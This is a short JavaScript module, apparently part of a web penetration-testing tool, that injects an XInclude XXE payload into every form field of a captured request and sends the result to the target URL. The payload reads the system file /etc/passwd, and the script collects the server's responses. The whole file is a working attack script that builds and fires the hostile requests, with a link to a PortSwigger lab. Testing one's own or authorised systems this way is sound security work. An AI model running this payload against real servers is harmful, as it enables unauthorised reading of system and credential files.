import { setup_response } from "../utils/methods.js";

export default async function post_formbody_attack(request) {
  let results = [];
  let listOfAttack = [];
  let lstOfAttacks = [
    // LINKS:WORKING - https://portswigger.net/web-security/xxe/lab-xinclude-attack
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&',
  ];

  for (let index = 0; index < lstOfAttacks.length; index++) {
    const attack = lstOfAttacks[index];

    let thebody = "";
    for (let x in request.fullrequest.requestBody.formData) {
      thebody += `${x}=${attack}`;
    }
    listOfAttack.push(`await fetch('${request.url}', {
      method: '${request.method}',
      body: '${thebody}',
    }).then((x) => x.text())`);

    await fetch(`${request.url}`, {
      method: `${request.method}`,
      body: `${thebody}`,
    })
      .then((x) => x.text())
      .then((x) => results.push(x));
  }

  setup_response(request, results, listOfAttack);
}
